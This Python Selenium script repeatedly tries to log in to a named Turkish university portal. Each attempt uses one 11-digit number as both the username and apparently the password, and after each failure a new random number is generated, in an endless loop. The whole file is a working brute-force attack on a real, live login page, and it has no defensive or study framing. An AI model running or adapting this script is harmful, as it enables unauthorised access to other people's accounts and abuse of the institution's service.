# -*- coding: utf-8 -*-
"""
Created on Mon Jan  4 02:07:20 2021

@author: BABA
"""
# -*- coding: utf-8 -*-

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
import random
#from selenium import webdriver

# Github credentials


username = "139361564201"

# initialize the Chrome driver



chrome_path = '/usr/bin/google-chrome-stable %U '
#webbrowser.get(chrome_path).open('https://aydep.ahievran.edu.tr/n/login')
# head to github login page
a=0
i=0
k=""
u=11
l=0
knt=3882
while knt==3882:
    k=""
    driver = webdriver.Chrome('C:/Program Files (x86)/Google/Chrome/Application/chromedriver.exe')
    driver.get("https://aydep.ahievran.edu.tr/n/login")
    driver.find_element_by_id("form2").send_keys(username)  
    driver.find_element_by_id("form4").send_keys(username)
    driver.find_element_by_name("login").click()

    WebDriverWait(driver=driver, timeout=20).until(
        lambda x: x.execute_script("return document.readyState === 'complete'")
)
    error_message = "Kullanıcı adı ve/veya şifre geçersiz"
# get the errors (if there are)
    errors = driver.find_elements_by_class_name("ui-pnotify-text")
# print the errors optionally
# for e in errors:
#     print(e.text)
# if we find that error message within errors, then login is failed
    if any(error_message in e.text for e in errors):
        print("[!] Login failed")
        driver.close()
        a=0
        for i in range(a,11,1): 
            username=random.randint(0,9)
            k=k+str(username)
            a=a+1
        
        username=k
       # username = "13936156420"
        
    
    
    else:
        print("[+] Login successful")
        #knt=knt+1
    
    # close the driver
#driver.close()